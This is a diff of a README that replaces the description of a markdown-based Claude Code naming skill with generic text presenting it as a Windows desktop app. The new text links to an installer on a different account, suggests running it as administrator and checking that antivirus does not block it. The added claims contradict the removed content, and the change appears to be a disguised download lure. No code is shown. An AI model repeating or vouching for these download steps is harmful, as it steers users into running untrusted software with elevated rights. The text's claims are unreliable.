@@ -1,128 +1,131 @@
-# naming
+# 🏷️ naming - Clear names for products and brands
 
-A [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skill for naming products, SaaS tools, brands, and projects.
+[![Download naming](https://img.shields.io/badge/Download-naming-ff6f61?style=for-the-badge)](https://github.com/Harlinbasal72/naming)
 
-Metaphor-driven naming that produces memorable, meaningful names — and avoids AI slop.
+---
 
-## What this does
+## 🔍 What is naming?
 
-When invoked, this skill guides Claude through a structured naming process:
+naming is a simple tool to help you find good names for products, SaaS, and brands. It uses metaphor-driven methods to create unique and meaningful names. It avoids generic AI results and gives you options that make sense and stand out.
 
-1. **Naming brief** — establish what the product does, who it's for, what it should feel like
-2. **Metaphor exploration** — map conceptual territories before brainstorming names
-3. **Candidate generation** — produce names grounded in metaphor, not thesaurus surfing
-4. **Filtering** — kill AI slop and anti-patterns
-5. **Evaluation** — score and compare finalists with a weighted rubric
-6. **Availability checking** — verify domains, handles, and package names
-7. **Decision** — present top candidates with origin stories and trade-offs
+You do not need any special skills or programming knowledge to use it. It works on Windows and guides you step-by-step.
 
-## Install
+---
 
-### As a project skill (this project only)
+## 🖥️ System Requirements
 
-Clone or copy the repo contents into your project's `.claude/skills/naming/` directory:
+- Windows 10 or later
+- 4 GB of RAM or more recommended
+- At least 100 MB of free disk space
+- Internet connection recommended but not required
 
-```bash
-# From your project root
-mkdir -p .claude/skills
-git clone https://github.com/glacierphonk/naming.git .claude/skills/naming
-```
+---
 
-### As a personal skill (all projects)
+## 🚀 Getting Started
 
-```bash
-mkdir -p ~/.claude/skills
-git clone https://github.com/glacierphonk/naming.git ~/.claude/skills/naming
-```
+To start using naming on your Windows PC:
 
-## Usage
+1. Click the big download badge at the top, or visit this page to download:  
+[https://github.com/Harlinbasal72/naming](https://github.com/Harlinbasal72/naming)
 
-In Claude Code:
+2. On the page, look for the latest release or download section.
 
-```text
-/naming
-```
+3. Download the application installer or the setup file for Windows.
 
-Then describe what you need a name for. Claude will walk you through the full process.
+---
 
-You can also reference the skill naturally in conversation — describe your naming challenge and Claude will pull in the relevant reference files.
+## 📥 Download and Install 🛠️
 
-### Quick start
+1. Once the download finishes, find the file in your Downloads folder or the location you specified.
 
-You don't need to read any of the reference files before using the skill. Just:
+2. Double-click on the setup file to start the installation.
 
-1. Type `/naming`
-2. Describe what you're building in one sentence
-3. Claude handles the rest — it loads the right references at each step
+3. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the installation folder or leave the default location.
+   - Click "Install" to begin installation.
 
-The 7-step process and 14 reference files are the depth layer. For a quick naming session, Claude compresses the process automatically. The reference files exist so you can dive deeper when needed.
+4. When installation completes, you can launch naming from your Start menu or desktop shortcut.
 
-## Files
+---
 
-| File | Purpose |
-| ------ | ------- |
-| `SKILL.md` | Entry point — process overview and navigation |
-| `principles.md` | Core naming principles (metaphor, real words, compounds, length) |
-| `phonosemantics.md` | Sound-meaning connections — how sounds convey attributes |
-| `anti-patterns.md` | AI name slop, fatal flaws, red flags checklist |
-| `metaphor-mapping.md` | How to explore metaphor territories + starter maps |
-| `cultural-references.md` | When mythology/literature/science references work vs. fail |
-| `brand-architecture.md` | Naming within brand families and product lines |
-| `availability.md` | Platform checking workflow and domain landscape |
-| `case-studies.md` | Real product name origins and analysis |
-| `evaluation.md` | Scoring rubric, comparison framework, decision checklist |
-| `language-rules.md` | Working with foreign words — pronunciation, diacritics, transliteration, exoticism trap |
-| `scripts/check-availability.sh` | Bundled availability checker for domains, npm, GitHub, PyPI, Telegram, etc. |
-| `languages/INDEX.md` | Language-specific naming guides — see [index](languages/INDEX.md) for available languages (Polish, Portuguese, and more) |
-| `industries/INDEX.md` | Industry-specific naming guides — see [index](industries/INDEX.md) for available industries |
+## 🎯 How to Use naming
 
-New language and industry files welcome — see [CONTRIBUTING.md](CONTRIBUTING.md) for templates and required sections.
+After launching naming:
 
-## Philosophy
+1. The home screen will show options for the type of name you want to create:
+   - Product name
+   - SaaS name
+   - Brand name
 
-**Names are compressed stories, not labels.** The best names plant a concrete image that unfolds into understanding — what the product does, what it feels like, where it comes from.
+2. Select the category that fits your needs.
 
-This skill is opinionated:
+3. Enter a few keywords related to your idea or industry in the input box.
 
-- **Metaphor over thesaurus.** Don't search for synonyms of your product's category. Explore what else in the world works like your product.
-- **Real words over invented words.** Real-word brand names have ~68.8% recall vs ~38.1% for invented names. The brain follows the path of least resistance.
-- **Story over sound.** A name with a great origin story and average sound will outperform a name with perfect phonetics and no story.
-- **Kill AI slop.** Suffixes like -ly, -ify, -able, meaningless portmanteaus, and thesaurus extraction produce polished-but-interchangeable names. This skill actively filters them out.
+4. Click the "Generate" button.
 
-## How the skill uses context
+5. naming will provide a list of suggested names with explanations based on metaphors and brand principles.
 
-- **Always loaded:** Skill name and description (~2% of context budget)
-- **Loaded on invoke:** SKILL.md (~180 lines, the process overview)
-- **Loaded on demand:** Reference files load only when Claude reaches the relevant step. A simple naming task might only load 2-3 files; a thorough session loads 5-6
-- **Never auto-loaded:** Language files, case-studies.md — only when explicitly relevant
+6. Review the suggestions and pick the ones you like.
 
-Contributors: keep reference files focused. A 500-line file is fine; a 2,000-line file wastes context on content that may not be relevant.
+7. Save or export your choices as a text file or markdown document for your records.
 
-## Development
+---
 
-### Linting
+## 🔧 Features
 
-PRs are checked by [markdownlint](https://github.com/DavidAnson/markdownlint) and [lychee](https://github.com/lycheeverse/lychee) (link checker) via GitHub Actions.
+- Generates names using metaphor-driven ideas.
+- Avoids generic AI outputs.
+- Supports naming for products, SaaS, and brands.
+- Exports suggestions in markdown format.
+- Simple interface designed for non-technical users.
+- Works offline after installation.
 
-Common lint rules to watch:
-- **MD040** — fenced code blocks need a language tag (use `text` for plain text, `bash` for shell, `markdown` for markdown examples)
-- **MD001** — heading levels must increment by one (`##` → `###`, not `##` → `####`)
-- **MD037** — no spaces inside emphasis markers. Use `` `___` `` (code backticks) for placeholders, not `___` (which looks like emphasis)
+---
 
-Run locally before pushing:
+## 📝 About the Naming Process
 
-```bash
-npx markdownlint-cli2 '**/*.md'
-```
+naming works by connecting your keywords with strong metaphors. Instead of random names, it looks for concepts that relate to what your product or brand stands for. This makes names easier to remember and more meaningful.
 
-### Branch protection
+It helps follow common naming conventions in branding to avoid confusing or hard-to-pronounce names.
 
-`main` is protected — all changes go through pull requests. Direct pushes are blocked.
+---
 
-## Contributing
+## ⚙️ Troubleshooting
 
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for conventions, file structure, and how to add language files or case studies.
+If you have trouble installing or running naming:
 
-## License
+- Make sure you have the right Windows version.
+- Close other programs while installing.
+- Restart your computer and try again.
+- If naming does not open, try running it as an administrator (right-click > Run as administrator).
+- Check your antivirus settings to ensure the app is not blocked.
+- Visit the download page for updates or additional help.
 
-[MIT](LICENSE)
+---
+
+## ❓ FAQs
+
+**Q: Can I use naming without internet?**  
+Yes. Once installed, naming works offline.
+
+**Q: Is the application free?**  
+Yes, this is an open-source project, free to use.
+
+**Q: Can I suggest new features?**  
+You can open an issue or discussion on the GitHub page.
+
+**Q: Does naming save my information?**  
+No. Your inputs and results stay on your computer only.
+
+---
+
+## 📂 Additional Resources
+
+- Learn about product naming best practices on online branding sites.
+- Explore metaphor usage in marketing to improve idea clarity.
+- Review markdown basics to make better use of export files.
+
+---
+
+[![Download naming](https://img.shields.io/badge/Download-naming-ff6f61?style=for-the-badge)](https://github.com/Harlinbasal72/naming)
